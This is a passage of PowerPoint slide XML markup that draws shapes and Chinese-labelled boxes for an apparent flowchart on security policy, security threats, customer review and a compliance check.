                  <a:gd name="T9" fmla="*/ 1 h 426"/>
                  <a:gd name="T10" fmla="*/ 1 w 576"/>
                  <a:gd name="T11" fmla="*/ 1 h 426"/>
                  <a:gd name="T12" fmla="*/ 1 w 576"/>
                  <a:gd name="T13" fmla="*/ 1 h 426"/>
                  <a:gd name="T14" fmla="*/ 1 w 576"/>
                  <a:gd name="T15" fmla="*/ 1 h 426"/>
                  <a:gd name="T16" fmla="*/ 1 w 576"/>
                  <a:gd name="T17" fmla="*/ 1 h 426"/>
                  <a:gd name="T18" fmla="*/ 1 w 576"/>
                  <a:gd name="T19" fmla="*/ 1 h 426"/>
                  <a:gd name="T20" fmla="*/ 1 w 576"/>
                  <a:gd name="T21" fmla="*/ 1 h 426"/>
                  <a:gd name="T22" fmla="*/ 1 w 576"/>
                  <a:gd name="T23" fmla="*/ 1 h 426"/>
                  <a:gd name="T24" fmla="*/ 1 w 576"/>
                  <a:gd name="T25" fmla="*/ 1 h 426"/>
                  <a:gd name="T26" fmla="*/ 1 w 576"/>
                  <a:gd name="T27" fmla="*/ 1 h 426"/>
                  <a:gd name="T28" fmla="*/ 1 w 576"/>
                  <a:gd name="T29" fmla="*/ 1 h 426"/>
                  <a:gd name="T30" fmla="*/ 1 w 576"/>
                  <a:gd name="T31" fmla="*/ 1 h 426"/>
                  <a:gd name="T32" fmla="*/ 1 w 576"/>
                  <a:gd name="T33" fmla="*/ 1 h 426"/>
                  <a:gd name="T34" fmla="*/ 1 w 576"/>
                  <a:gd name="T35" fmla="*/ 1 h 426"/>
                  <a:gd name="T36" fmla="*/ 1 w 576"/>
                  <a:gd name="T37" fmla="*/ 1 h 426"/>
                  <a:gd name="T38" fmla="*/ 0 w 576"/>
                  <a:gd name="T39" fmla="*/ 1 h 42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6"/>
                  <a:gd name="T61" fmla="*/ 0 h 426"/>
                  <a:gd name="T62" fmla="*/ 576 w 576"/>
                  <a:gd name="T63" fmla="*/ 426 h 42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6" h="426">
                    <a:moveTo>
                      <a:pt x="0" y="373"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="0" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="576" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="576" y="373"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="543" y="350"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="509" y="333"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="470" y="324"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="432" y="320"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="394" y="324"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="355" y="333"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="321" y="350"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="288" y="373"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="255" y="395"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="221" y="412"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="182" y="422"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="144" y="426"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="106" y="422"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="67" y="412"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="33" y="395"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="373"/>
                    </a:lnTo>
                    <a:close/>
                  </a:path>
                </a:pathLst>
              </a:custGeom>
              <a:solidFill>
                <a:srgbClr val="CCFFFF"/>
              </a:solidFill>
              <a:ln w="3175">
                <a:solidFill>
                  <a:schemeClr val="folHlink"/>
                </a:solidFill>
                <a:round/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="en-US"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="110" name="未知"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="0" y="71"/>
                <a:ext cx="382" cy="282"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 0 w 576"/>
                  <a:gd name="T1" fmla="*/ 1 h 425"/>
                  <a:gd name="T2" fmla="*/ 0 w 576"/>
                  <a:gd name="T3" fmla="*/ 0 h 425"/>
                  <a:gd name="T4" fmla="*/ 1 w 576"/>
                  <a:gd name="T5" fmla="*/ 0 h 425"/>
                  <a:gd name="T6" fmla="*/ 1 w 576"/>
                  <a:gd name="T7" fmla="*/ 1 h 425"/>
                  <a:gd name="T8" fmla="*/ 1 w 576"/>
                  <a:gd name="T9" fmla="*/ 1 h 425"/>
                  <a:gd name="T10" fmla="*/ 1 w 576"/>
                  <a:gd name="T11" fmla="*/ 1 h 425"/>
                  <a:gd name="T12" fmla="*/ 1 w 576"/>
                  <a:gd name="T13" fmla="*/ 1 h 425"/>
                  <a:gd name="T14" fmla="*/ 1 w 576"/>
                  <a:gd name="T15" fmla="*/ 1 h 425"/>
                  <a:gd name="T16" fmla="*/ 1 w 576"/>
                  <a:gd name="T17" fmla="*/ 1 h 425"/>
                  <a:gd name="T18" fmla="*/ 1 w 576"/>
                  <a:gd name="T19" fmla="*/ 1 h 425"/>
                  <a:gd name="T20" fmla="*/ 1 w 576"/>
                  <a:gd name="T21" fmla="*/ 1 h 425"/>
                  <a:gd name="T22" fmla="*/ 1 w 576"/>
                  <a:gd name="T23" fmla="*/ 1 h 425"/>
                  <a:gd name="T24" fmla="*/ 1 w 576"/>
                  <a:gd name="T25" fmla="*/ 1 h 425"/>
                  <a:gd name="T26" fmla="*/ 1 w 576"/>
                  <a:gd name="T27" fmla="*/ 1 h 425"/>
                  <a:gd name="T28" fmla="*/ 1 w 576"/>
                  <a:gd name="T29" fmla="*/ 1 h 425"/>
                  <a:gd name="T30" fmla="*/ 1 w 576"/>
                  <a:gd name="T31" fmla="*/ 1 h 425"/>
                  <a:gd name="T32" fmla="*/ 1 w 576"/>
                  <a:gd name="T33" fmla="*/ 1 h 425"/>
                  <a:gd name="T34" fmla="*/ 1 w 576"/>
                  <a:gd name="T35" fmla="*/ 1 h 425"/>
                  <a:gd name="T36" fmla="*/ 1 w 576"/>
                  <a:gd name="T37" fmla="*/ 1 h 425"/>
                  <a:gd name="T38" fmla="*/ 0 w 576"/>
                  <a:gd name="T39" fmla="*/ 1 h 4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6"/>
                  <a:gd name="T61" fmla="*/ 0 h 425"/>
                  <a:gd name="T62" fmla="*/ 576 w 576"/>
                  <a:gd name="T63" fmla="*/ 425 h 4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6" h="425">
                    <a:moveTo>
                      <a:pt x="0" y="373"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="0" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="576" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="576" y="373"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="543" y="350"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="509" y="333"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="470" y="323"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="432" y="320"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="394" y="323"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="355" y="333"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="321" y="350"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="288" y="373"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="255" y="395"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="221" y="412"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="182" y="422"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="144" y="425"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="106" y="422"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="67" y="412"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="33" y="395"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="373"/>
                    </a:lnTo>
                    <a:close/>
                  </a:path>
                </a:pathLst>
              </a:custGeom>
              <a:solidFill>
                <a:srgbClr val="CCFFFF"/>
              </a:solidFill>
              <a:ln w="3175">
                <a:solidFill>
                  <a:schemeClr val="folHlink"/>
                </a:solidFill>
                <a:round/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="en-US"/>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="23" name="Rectangle 65"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="6566916" y="1999073"/>
              <a:ext cx="6302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0" hangingPunct="0">
                <a:lnSpc>
                  <a:spcPct val="85000"/>
                </a:lnSpc>
              </a:pPr>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="tx2"/>
                  </a:solidFill>
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                  <a:cs typeface="Arial" charset="0"/>
                </a:rPr>
                <a:t>安全</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0">
                <a:lnSpc>
                  <a:spcPct val="85000"/>
                </a:lnSpc>
              </a:pPr>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="tx2"/>
                  </a:solidFill>
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                  <a:cs typeface="Arial" charset="0"/>
                </a:rPr>
                <a:t>策略</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="41" name="Line 109"/>
            <p:cNvSpPr>
              <a:spLocks noChangeShapeType="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm rot="5400000" flipH="1">
              <a:off x="6265291" y="1902235"/>
              <a:ext cx="3175" cy="561975"/>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5" name="组合 154"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="3395093" y="1784227"/>
            <a:ext cx="1085551" cy="552450"/>
            <a:chOff x="3488755" y="1775235"/>
            <a:chExt cx="1085551" cy="552450"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="35" name="Group 100"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="3488755" y="1775235"/>
              <a:ext cx="685800" cy="552450"/>
              <a:chOff x="0" y="0"/>
              <a:chExt cx="432" cy="348"/>
            </a:xfrm>
            <a:solidFill>
              <a:srgbClr val="CCECFF"/>
            </a:solidFill>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="83" name="AutoShape 101"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="78" y="0"/>
                <a:ext cx="354" cy="270"/>
              </a:xfrm>
              <a:prstGeom prst="roundRect">
                <a:avLst>
                  <a:gd name="adj" fmla="val 16667"/>
                </a:avLst>
              </a:prstGeom>
              <a:grpFill/>
              <a:ln w="3175">
                <a:solidFill>
                  <a:schemeClr val="folHlink"/>
                </a:solidFill>
                <a:round/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr wrap="none" anchor="ctr"/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="1600">
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="84" name="AutoShape 102"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="39" y="39"/>
                <a:ext cx="354" cy="270"/>
              </a:xfrm>
              <a:prstGeom prst="roundRect">
                <a:avLst>
                  <a:gd name="adj" fmla="val 16667"/>
                </a:avLst>
              </a:prstGeom>
              <a:grpFill/>
              <a:ln w="3175">
                <a:solidFill>
                  <a:schemeClr val="folHlink"/>
                </a:solidFill>
                <a:round/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr wrap="none" anchor="ctr"/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="1600">
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="85" name="AutoShape 103"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="0" y="78"/>
                <a:ext cx="354" cy="270"/>
              </a:xfrm>
              <a:prstGeom prst="roundRect">
                <a:avLst>
                  <a:gd name="adj" fmla="val 16667"/>
                </a:avLst>
              </a:prstGeom>
              <a:grpFill/>
              <a:ln w="3175">
                <a:solidFill>
                  <a:schemeClr val="folHlink"/>
                </a:solidFill>
                <a:round/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr wrap="none" anchor="ctr"/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="1600">
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="36" name="Rectangle 104"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3525267" y="1899060"/>
              <a:ext cx="50323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0" hangingPunct="0">
                <a:lnSpc>
                  <a:spcPct val="80000"/>
                </a:lnSpc>
              </a:pPr>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="FF0000"/>
                  </a:solidFill>
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                  <a:cs typeface="Arial" charset="0"/>
                </a:rPr>
                <a:t>安全</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0">
                <a:lnSpc>
                  <a:spcPct val="80000"/>
                </a:lnSpc>
              </a:pPr>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="FF0000"/>
                  </a:solidFill>
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                  <a:cs typeface="Arial" charset="0"/>
                </a:rPr>
                <a:t>威胁</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="42" name="Line 110"/>
            <p:cNvSpPr>
              <a:spLocks noChangeShapeType="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm rot="16200000">
              <a:off x="4349286" y="1844818"/>
              <a:ext cx="15064" cy="434976"/>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61" name="组合 160"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="3155121" y="4020125"/>
            <a:ext cx="2938981" cy="698335"/>
            <a:chOff x="3155121" y="4020125"/>
            <a:chExt cx="2938981" cy="698335"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="9" name="Line 39"/>
            <p:cNvSpPr>
              <a:spLocks noChangeShapeType="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm flipH="1">
              <a:off x="5382641" y="4323173"/>
              <a:ext cx="3175" cy="39528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Rectangle 42"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm rot="114884">
              <a:off x="3834830" y="4243798"/>
              <a:ext cx="1533525" cy="20002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sz="2400">
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="34" name="Rectangle 99"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm rot="122584">
              <a:off x="3771330" y="4199110"/>
              <a:ext cx="819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1600" b="1" dirty="0">
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                  <a:cs typeface="Arial" charset="0"/>
                </a:rPr>
                <a:t>客户审阅</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="43" name="AutoShape 111"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4620641" y="4179355"/>
              <a:ext cx="1473461" cy="314046"/>
            </a:xfrm>
            <a:prstGeom prst="flowChartDecision">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="FFFF00"/>
            </a:solidFill>
            <a:ln w="9525">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
              <a:miter lim="800000"/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
                <a:t>合规？</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="1800" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="46" name="Group 126"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="3155121" y="4020125"/>
              <a:ext cx="606425" cy="449262"/>
              <a:chOff x="0" y="0"/>
              <a:chExt cx="382" cy="283"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="59" name="未知"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="134" y="58"/>
                <a:ext cx="114" cy="79"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 1 w 172"/>
                  <a:gd name="T1" fmla="*/ 1 h 119"/>
                  <a:gd name="T2" fmla="*/ 1 w 172"/>
                  <a:gd name="T3" fmla="*/ 1 h 119"/>
                  <a:gd name="T4" fmla="*/ 1 w 172"/>
                  <a:gd name="T5" fmla="*/ 1 h 119"/>
                  <a:gd name="T6" fmla="*/ 1 w 172"/>
                  <a:gd name="T7" fmla="*/ 0 h 119"/>
                  <a:gd name="T8" fmla="*/ 1 w 172"/>
                  <a:gd name="T9" fmla="*/ 0 h 119"/>
                  <a:gd name="T10" fmla="*/ 0 w 172"/>
                  <a:gd name="T11" fmla="*/ 1 h 119"/>
                  <a:gd name="T12" fmla="*/ 1 w 172"/>
                  <a:gd name="T13" fmla="*/ 1 h 119"/>
                  <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T15" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T16" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T17" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T18" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T19" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T20" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T21" fmla="*/ 0 w 172"/>
                  <a:gd name="T22" fmla="*/ 0 h 119"/>
                  <a:gd name="T23" fmla="*/ 172 w 172"/>
                  <a:gd name="T24" fmla="*/ 119 h 1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2" h="119">
                    <a:moveTo>
                      <a:pt x="5" y="119"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="165" y="119"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="172" y="13"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="115" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="57" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="13"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="5" y="119"/>
                    </a:lnTo>
                    <a:close/>
                  </a:path>
                </a:pathLst>
              </a:custGeom>
              <a:solidFill>
                <a:schemeClr val="folHlink"/>
              </a:solidFill>
              <a:ln w="3175">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:round/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="en-US"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="60" name="Rectangle 128"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="0" y="137"/>
                <a:ext cx="382" cy="146"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:srgbClr val="9966FF"/>
              </a:solidFill>
              <a:ln w="3175">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:miter lim="800000"/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="1800">
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="61" name="Line 129"/>
              <p:cNvSpPr>
                <a:spLocks noChangeShapeType="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="162" y="102"/>
                <a:ext cx="0" cy="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130"/>
              <p:cNvSpPr>
                <a:spLocks noChangeShapeType="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="219" y="102"/>
                <a:ext cx="0" cy="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未知"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="143" y="168"/>
                <a:ext cx="95" cy="88"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 1 w 144"/>
                  <a:gd name="T1" fmla="*/ 1 h 134"/>
                  <a:gd name="T2" fmla="*/ 1 w 144"/>
                  <a:gd name="T3" fmla="*/ 1 h 134"/>
                  <a:gd name="T4" fmla="*/ 1 w 144"/>
                  <a:gd name="T5" fmla="*/ 1 h 134"/>
                  <a:gd name="T6" fmla="*/ 1 w 144"/>
                  <a:gd name="T7" fmla="*/ 1 h 134"/>
                  <a:gd name="T8" fmla="*/ 1 w 144"/>
                  <a:gd name="T9" fmla="*/ 1 h 134"/>
                  <a:gd name="T10" fmla="*/ 1 w 144"/>
                  <a:gd name="T11" fmla="*/ 1 h 134"/>
                  <a:gd name="T12" fmla="*/ 1 w 144"/>
                  <a:gd name="T13" fmla="*/ 1 h 134"/>
                  <a:gd name="T14" fmla="*/ 1 w 144"/>
                  <a:gd name="T15" fmla="*/ 0 h 134"/>
                  <a:gd name="T16" fmla="*/ 1 w 144"/>
                  <a:gd name="T17" fmla="*/ 0 h 134"/>
                  <a:gd name="T18" fmla="*/ 1 w 144"/>
                  <a:gd name="T19" fmla="*/ 1 h 134"/>
                  <a:gd name="T20" fmla="*/ 1 w 144"/>
                  <a:gd name="T21" fmla="*/ 1 h 134"/>
                  <a:gd name="T22" fmla="*/ 0 w 144"/>
                  <a:gd name="T23" fmla="*/ 1 h 134"/>
                  <a:gd name="T24" fmla="*/ 0 w 144"/>
                  <a:gd name="T25" fmla="*/ 1 h 134"/>
                  <a:gd name="T26" fmla="*/ 1 w 144"/>
                  <a:gd name="T27" fmla="*/ 1 h 134"/>
                  <a:gd name="T28" fmla="*/ 1 w 144"/>
                  <a:gd name="T29" fmla="*/ 1 h 134"/>
                  <a:gd name="T30" fmla="*/ 1 w 144"/>
                  <a:gd name="T31" fmla="*/ 1 h 134"/>
                  <a:gd name="T32" fmla="*/ 1 w 144"/>
                  <a:gd name="T33" fmla="*/ 1 h 1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4"/>
                  <a:gd name="T52" fmla="*/ 0 h 134"/>
                  <a:gd name="T53" fmla="*/ 144 w 144"/>
                  <a:gd name="T54" fmla="*/ 134 h 1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4" h="134">
                    <a:moveTo>
                      <a:pt x="131" y="134"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="136" y="132"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="142" y="126"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="144" y="121"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="144" y="13"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="142" y="7"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="136" y="2"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="131" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="15" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="8" y="2"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="2" y="7"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="13"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="121"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="2" y="126"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="8" y="132"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="15" y="134"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="131" y="134"/>
                    </a:lnTo>
                    <a:close/>
                  </a:path>
                </a:pathLst>
              </a:custGeom>
              <a:solidFill>
                <a:srgbClr val="FFFFFF"/>
              </a:solidFill>
              <a:ln w="9525">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:round/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="en-US"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="64" name="未知"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="150" y="176"/>
                <a:ext cx="80" cy="72"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 0 w 120"/>
                  <a:gd name="T1" fmla="*/ 1 h 108"/>
                  <a:gd name="T2" fmla="*/ 1 w 120"/>
